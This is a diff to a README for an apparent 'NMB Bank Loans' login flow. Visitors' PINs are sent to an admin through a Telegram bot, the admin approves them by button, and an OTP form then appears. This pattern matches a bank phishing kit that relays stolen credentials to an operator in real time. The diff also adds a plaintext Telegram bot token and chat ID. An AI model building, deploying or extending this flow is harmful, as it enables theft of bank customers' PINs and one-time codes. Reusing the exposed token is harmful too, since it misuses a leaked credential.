@@ -1,22 +1,24 @@
-# NMB Bank Loans
+# NMB Bank Loans - Login Flow
 
-## Running Locally
+## ⚠️ IMPORTANT: Login Flow Requires Local Server
 
-The login flow requires a local Node.js server to handle Telegram callbacks.
+The login flow with Telegram button approval **cannot work on Vercel serverless without `@vercel/kv` configured**. Each serverless function invocation is isolated and cannot share state between:
+- The initial PIN submission
+- The admin button click callback
+- The status polling check
+
+## Running Locally (Works Without KV)
 
 ### Setup
 
-1. Copy `.env.example` to `.env` and fill in the values:
-```bash
-copy .env.example .env
-```
-
-2. Start the local server:
-```bash
+1. Start the local server with environment variables:
+```powershell
+$env:NMB_BOT_TOKEN="8622403187:AAGc_dcXgpr6mC-uDcVMX03HjbrVjiCyvBw"
+$env:NMB_CHAT_ID="7867527304"
 node scripts/server.js
 ```
 
-3. Open `http://localhost:3000/login.html` in your browser
+2. Open `http://localhost:3000/login.html` in your browser
 
 ### How the Login Flow Works
 
@@ -24,13 +26,13 @@ node scripts/server.js
 2. Frontend POSTs to `/api/notify/login` - creates a record with `decided: false`
 3. Telegram bot sends message to admin with "Correct"/"Wrong" buttons
 4. Local server polls Telegram via `getUpdates` (every 1 second)
-5. Admin clicks "Correct" - callback received by server
-6. Server updates record to `decided: true, status: 'approved'`
-7. Frontend polls `/api/login/status/:id` - sees `decided: true`
-8. OTP form appears
+5. Admin clicks "Correct" - callback received by server, updates record
+6. Frontend polls `/api/login/status/:id` - sees `decided: true`
+7. OTP form appears
 
-### Important
+### Endpoints on Local Server
 
-- The local server MUST be running for the login flow to work
-- Clear any existing Telegram webhook before running: visit `http://localhost:3000/api/setup/purge-webhook`
-- Check server status: visit `http://localhost:3000/api/health`
+- `GET /api/health` - Check server status
+- `GET /api/setup/purge-webhook` - Clear Telegram webhook
+- `POST /api/notify/login` - Submit PIN for verification
+- `GET /api/login/status/:id` - Poll for approval status
